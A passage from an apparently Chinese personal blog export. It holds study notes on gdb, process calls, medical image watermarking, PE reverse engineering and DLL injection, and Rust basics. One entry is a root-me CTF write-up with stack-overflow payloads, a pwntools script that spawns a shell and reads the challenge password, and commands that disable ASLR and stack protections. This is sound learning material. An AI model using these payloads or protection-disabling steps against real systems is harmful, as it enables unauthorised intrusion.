<h3 id="r2"><a href="#r2" class="headerlink" title="r2"></a>r2</h3><p><code>help x</code><br>命令：x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。</p>
<p><code>gdb-peda$ x/141xb 0x400ac0</code></p>
<hr>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>pid_t fork(void)<br>fork系统调用用于创建一个新进程，称为子进程，它与进程（称为系统调用fork的进程）<code>同时运行</code>，此进程称为父进程。创建新的子进程后，两个进程将<code>执行</code>fork（）系统调用之后的<code>下一条指令</code>。</p>
<p>返回值： 若成功调用一次则返回两个值，<code>子进程返回0</code>，<code>父进程返回子进程ID</code>；否则，出错返回-1</p>
<p>这意味着父子进程间不共享这些<code>存储空间</code>。</p>
<hr>
<pre><code>0x4008d1:    call   0x400630 &lt;fork@plt&gt;</code></pre>
<p>调用后返回0， 则当前的子进程</p>
<hr>
<p><del>gdb catch 捕获异常</del></p>
<h3 id="waitpid"><a href="#waitpid" class="headerlink" title="waitpid"></a>waitpid</h3><p>作用同于wait，但可指定pid进程清理，可以不阻塞。</p>
<p><code>pid_t waitpid(pid_t pid,int *status,int options);</code>成功：返回清理掉的子进程ID；失败：-1（无子进程）</p>
<ul>
<li>pid&gt;0    只等待进程ID等于pid的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，waitpid就会一直等下去。</li>
</ul>
<ul>
<li>参数status如果不是一个空指针,则终止进程的终止状态就存放在status所指向的单元。</li>
</ul>
<hr>
<h3 id="SAR"><a href="#SAR" class="headerlink" title="SAR"></a>SAR</h3><p>SAR 算术右移指令<br>符号位保持不变</p>
<p>call rax 如果都不跳转，则到这里<br>0x7ffff7ffb07b:    mov    al,0x3c<br>   0x7ffff7ffb07d:    mov    edi,0x0<br>   0x7ffff7ffb082:    syscall </p>
<h2 id="没有解出来-tw-1f198-worried"><a href="#没有解出来-tw-1f198-worried" class="headerlink" title="没有解出来:tw-1f198::worried:"></a>没有解出来:tw-1f198::worried:</h2>]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记1</title>
    <url>/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<ol>
<li>the  water-mark robustness is the key performance parameter.</li>
<li>a  watermark  can  be  embedded  in  every  frame.  </li>
<li>watermarking that pro-tects the content even after decryption<a id="more"></a></li>
<li>due  to  higher  data  embedding  capacity of image,</li>
<li>visible watermark is a secondary translu-cent  overlaid  into  the  primary  image. </li>
<li>Dual watermark is a combination of a visible and an invisible watermark </li>
<li>the  watermarking  system  consists  of  two  processes  -  encoding  and  extraction  process<br><img src="https://s2.ax1x.com/2020/01/21/1kQhQA.png"></li>
</ol>
<p>lossy compression 有损压缩<br>steganography  隐写术<br>obustness 健壮性<br>exponentially 指数地<br>archiving 存档<br>geometrical 几何<br>Classification 分类<br>Spatial 空间的<br>cryptography 密码学<br>pixel 像素点 [ˈpɪksl]<br>designated  特定的<br>confidentiality 保密<br>on  account of 由于<br>Tamper 篡改<br>confidentiality 机密性</p>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记2</title>
    <url>/2020/01/23/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>state-of-the-art 最先进的<br>Error Correcting Codes  ECC<br>discrete wavelet transform (DWT) 离散小波变换<br>The  ECC  based  watermarking  methods  attempt  to  find  a  trade-off  between the number of bits to be embedded and the number of bit-errors that can be corrected.  </p>
<p>the  technique  embeds  medical  text  watermarks  into  selected  sub-band  of  discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。</p>
<p> **Any  image  com-prises of two sections called ROI and NROI **</p>
<a id="more"></a>
<p> ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is  present  in  this  area  [105].  NROI  is  an  area  of  image  that  does  not  have  an  important  data  i.e.  background  of  image.<br> The  spatial  domain  tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple.<br> In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform  (DWT),  discrete  cosine  transform  (DCT),  singular  value  decomposition  (SVD) and discrete Fourier transform (DFT).<br>finite energy function 有限能量函数</p>
<p>在数位信号处理领域中，降采样，又作减采集,是一种多速率数字信号处理的技术或是降低信号采样率的过程，通常用于降低数据传输速率或者数据大小。<br>降采样因子（常用表示符号为＂M＂）一般是大于１的整数或有理数。<br>这个因子表达采样周期变成原来的M倍，或者等价表示采样率变成原来的1/M倍。 采样率的降低会造成频谱的压缩，因此需要利用滤波器确保在较低的采样频率下不发生混叠，确保奈奎式采样定理依旧成立。</p>
<p>形式幂级数上的一个重要映射是系数的提取操作：将一个形式幂级数映射到它的X^n的系数。这个操作常常记作[X^n]，</p>
<p>以一变数为t 的函数 f(t) 为例，f(t) 经过一积分转换T 得到Tf(u)：<br>其中 K 是个确定的二元函数, 称为此积分变换的核函数（kernel function）或核（nucleus）。当选取不同的积分域和变换核时，就得到不同名称的积分变换。f(t) 称为象原函数，Tf(u) 称为 f(t) 的象函数，在一定条件下，它们是一一对应而变换是可逆的。</p>
<p>定义在实数域上的实函数相对于值c的n阶矩为:</p>
<p>如果f(x)是概率密度函数，则容易看出相对于值0的1阶矩是连续随机变量的数学期望。</p>
<p>vanishing moment</p>
<p>母小波定义为<br><img src="https://s2.ax1x.com/2020/01/23/1EbUyt.png" alt="1EbUyt.png"><br>其中a是缩放因子，当|a|&lt;1时，母小波被压缩，在时间轴上有较小的支撑度，并且对应到高频，因为母小波变窄、变化变快， 反之，当|a|&gt;1时，母小波变宽、变化较慢，所以对应到低频。b则是平移参数，用来决定母小波的位置。<br>小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。<br>在信号处理中，窗函数（英语：window function）是一种除在给定区间之外取值均为0的实函数。譬如：在给定区间内为常数而在区间外为0的窗函数被形象地称为矩形窗。任何函数与窗函数之积仍为窗函数，所以相乘的结果就像透过窗口“看”其他函数一样</p>
<p>变换(Transform)、量化(Quantization)和编码(Coding)[<br>另外，当输入信号为二维时（例如：影像），短时距傅里叶变换的输出为四维度，但小波变换仍是二维信号，所以在影像处理上通常会使用小波变换而非短时距傅里叶变<br>换。</p>
<p>ΣΣ 这是二重求和符号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">i=m j=n</span><br><span class="line">..Σ... Σ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+</span><br><span class="line">i=<span class="number">1</span> j=<span class="number">1</span> . . . . . . .+a2b1+a2b2+ . . . +a2bn+</span><br><span class="line">. . . . . .. . . . . . . . . . +. . . . +</span><br><span class="line">. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.</span><br></pre></td></tr></table></figure>




]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记3</title>
    <url>/2020/01/25/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p>There  are  a  wide  variety  of  popular  wavelet  algorithms,  including  Daubechies  wavelets,  Mexican  Hat  wavelets  and  Morlet  wavelets </p>
<p>HAAR</p>
<p>In addition, the Haar wavelet transform is fast, memory efficient and  exactly  reversible  without  the  edge  effects  that  are  present  in  other  wavelet  transforms.</p>
<p>the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to  maintain  better  image  quality. </p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记4</title>
    <url>/2020/01/28/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<p>orthonormal matrices  正交矩阵<br>a  message  can  be  hidden  in  cover document   if   the   content   of   the   document   hashigh redundancy.<br>propose  a  new  reliable  method  by hiding  the  encrypted  watermark  in  the  RONI  part  of  the medical   image   using   DWT   approach.<br>ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文</p>
<p>直方图均衡化（Histogram Equalization）</p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN keep going</title>
    <url>/2020/11/10/PWN_keep_going/</url>
    <content><![CDATA[<h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p>
<p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p>
<pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre>
<a id="more"></a>
<p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p>
<ol>
<li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li>
<li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li>
</ol>
<p><code>-z execstack </code>禁用NX保护</p>
<p>详细的保护机制讲解<br><a href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p>
<pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`

gdb-peda$ help p</code></pre>
<p>Print value of expression EXP.</p>
<pre><code>gdb-peda$ p/x $rip</code></pre>
<p><strong>这个教程太老了，还是32位上的</strong></p>
<hr>
<p>*经典root-me *</p>
<h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p>
<pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre>
<hr>
<pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)

gdb-peda$ x/20xg $rsp</code></pre>
<p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p>
<hr>
<h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebp
ret = pop EIP</code></pre>
<p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p>
<h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p>
<p>de08-dd00=0x108  ==264</p>
<h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre>
<p><del>ASLR 开起来了</del></p>
<p>输入是”A”*264+”ABCDEF”</p>
<pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre>
<p>是<code>按序</code>填充的</p>
<p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p>
<hr>
<h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p>
<pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre>
<p><code>0x7fffffffdc90</code>buf在栈中开始地址</p>
<p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p>
<hr>
<p>本题考察了Unix基本输入输出流与缓冲</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p>
<p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p>
<hr>
<p>别人使用脚本编写的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p>关于unix系统输入输出流<br><a href="http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf" title="stdio buffer">stdio buffer</a><br>参考：<a href="http://showlinkroom.me/2017/11/20/Root-me-App-System01/">http://showlinkroom.me/2017/11/20/Root-me-App-System01/</a></p>
<pre><code>python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; + &quot;\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13</code></pre>
<p>将stdin buffer填满，让数据不填入buffer中，留在外面。</p>
<pre><code>(python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; &#39;; cat ) | ./ch13</code></pre>
<p>不让当前的数据流中断，不会让输入流关闭的指令，直接使用cat的功能为将输入流复制到输出流中。</p>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE 初探</title>
    <url>/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == 加壳？<br>代码压缩器，执行时解码后运行<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p>
<a id="more"></a>
<hr>
<p>段寄存器 16 位<br>DS 存放数据段的段基址</p>
<hr>
<p>每一个<code>内存单元的宽度为8位</code>。<br>[编号]称为地址。<br>内存单元：字节 <code>每个字节有个编号</code>，称为<code>内存地址</code></p>
<hr>
<p>dword ptr [esi+13000]=[notepad.01014000]=14D L’ō’</p>
<p>ds 寄存器没用？</p>
<hr>
<p>在栈中设置硬件断点 找到解壳后的OEP<br>具体在<code>PUSHAD</code>中设置硬件断点，指令完成后才暂停 ，也就是<code>POPAD</code> 完成后暂停 ，后面JMP跳转到<code>OEP</code> original EP</p>
<hr>
<p>exe默认00400000<br>dll 默认10000000</p>
<hr>
<h4 id="节对齐"><a href="#节对齐" class="headerlink" title="节对齐"></a>节对齐</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like “.text”) that contains<code> 513</code> bytes of data:</p>
<p><code>不足的改为整数倍</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096 </code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p>
<hr>
<h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>修改size of optional header值，向文件头插入解码代码<br>在选项头和节区头间插入代码<br>numberofRVAandSIZES表示data_directory结构体元素个数(有些没用，可以覆盖)</p>
<h4 id="inline-patch-内嵌补丁"><a href="#inline-patch-内嵌补丁" class="headerlink" title="inline patch 内嵌补丁"></a>inline patch 内嵌补丁</h4><p>将补丁代码放在空白块中</p>
<hr>
<p>变量名和函数名只是地址的一种助记符，当源文件被编译和链接成可执行程序后，它们都会被替换成地址。</p>
<p>取地址符&amp;</p>
<p>.text 的 size of raw data == 400 virtual size == 280 文件中400 加载到内存中只加了280<br>其他值时0x00</p>
<hr>
<p>image_scn_men_write 相应内存区的写权限</p>
<hr>
<h4 id="rep-movsb-命令"><a href="#rep-movsb-命令" class="headerlink" title="rep movsb 命令"></a>rep movsb 命令</h4><p> b==byte rep == repeats ECX 里大小 循环</p>
<h4 id="moves-命令"><a href="#moves-命令" class="headerlink" title="moves  命令"></a>moves  命令</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p>
<h4 id="RCE经验"><a href="#RCE经验" class="headerlink" title="RCE经验"></a>RCE经验</h4><p>1 压缩器解码<br>2 区域双重加密 内嵌补丁</p>
<hr>
<h4 id="test-按位与"><a href="#test-按位与" class="headerlink" title="test 按位与"></a>test 按位与</h4><p>test eax, eax<br>eax==0 zf 设位1</p>
<hr>
<h4 id="Ret相当于-Pop-EIP"><a href="#Ret相当于-Pop-EIP" class="headerlink" title="Ret相当于 Pop EIP"></a>Ret相当于 Pop EIP</h4><hr>
<h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>threadProc 线程创建函数<br>用句柄控制相应进程<br>三种方法：<br>创建远程线程<br>钩子注入<br>设置里全局注入</p>
<p>SPaCIoS</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习1</title>
    <url>/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h3 id="运行命令"><a href="#运行命令" class="headerlink" title="运行命令"></a>运行命令</h3><p><code>cargo doc --open</code><br><code>rustup doc</code><br><code>cargo new --vcs=git</code><br><code>cargo build</code><br><code>cargo run </code><br><code>cargo check </code>更快编译，但不生成可执行文件<br><code>cargo build --release</code> 生成的执行文件运行更快<br>benchmark基准测试</p>
<a id="more"></a>
<p>Variables and Mutability<br>mutable 易变的</p>
<p>let mut x=5</p>
<h6 id="rust默认变量不可变"><a href="#rust默认变量不可变" class="headerlink" title="rust默认变量不可变"></a>rust默认变量不可变</h6><p>fn main() {<br>const MAX_POINTS: u32 = 100_000;<br>}<br>const 整个运行时间都存在</p>
<p>fn main() {<br>    let spaces = “   “;<br>    let spaces = spaces.len();<br>}</p>
<h3 id="Data-Types"><a href="#Data-Types" class="headerlink" title="Data Types"></a>Data Types</h3><p>interger 默认i32<br>float 默认 f64<br>char ‘’ 4字节*Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. *<br>string “”</p>
<p>tuple 元组 固定 类型可以不同</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let tup: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let x: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let five_hundred = x<span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">    let six_point_four = x<span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line">    let one = x<span class="number">.2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>array 数组 类型相同 固定 存在栈中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> months = [<span class="string">&quot;January&quot;</span>, <span class="string">&quot;February&quot;</span>, <span class="string">&quot;March&quot;</span>, <span class="string">&quot;April&quot;</span>, <span class="string">&quot;May&quot;</span>, <span class="string">&quot;June&quot;</span>, <span class="string">&quot;July&quot;</span>,</span><br><span class="line">              <span class="string">&quot;August&quot;</span>, <span class="string">&quot;September&quot;</span>, <span class="string">&quot;October&quot;</span>, <span class="string">&quot;November&quot;</span>, <span class="string">&quot;December&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a: [i32; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> first = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>rust会检查索引跃出</p>
<p>vector 不固定</p>
<h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    another_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn another_function() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;Another function.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Rust<code>doesn’t care</code>where you define your functions, only that they’re defined somewhere.</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    another_function(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn another_function(x: i32, y: i32) &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>必须声明参数类型</p>
<hr>
<p><code>Statements</code>are instructions that perform some action and do not return a value.<br>let y = 6; 无返回值不能赋给其他变量<br><code>Expressions</code> evaluate to a resulting value.</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> y = &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> Note the x + 1 line without a semicolon at the end, which is unlike most of the lines you’ve seen so far. <strong>Expressions do not include ending semicolons.</strong> If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value.</p>
<p>返回值</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn five() -&gt; i32 &#123;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = five();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = plus_one(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn plus_one(x: i32) -&gt; i32 &#123;</span><br><span class="line">    x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h5><p>//</p>
<h3 id="control"><a href="#control" class="headerlink" title="control"></a>control</h3><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;condition was true&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">&quot;condition was false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> Rust will <strong>not</strong> automatically try to <strong>convert non-Boolean types to a Boolean</strong></p>
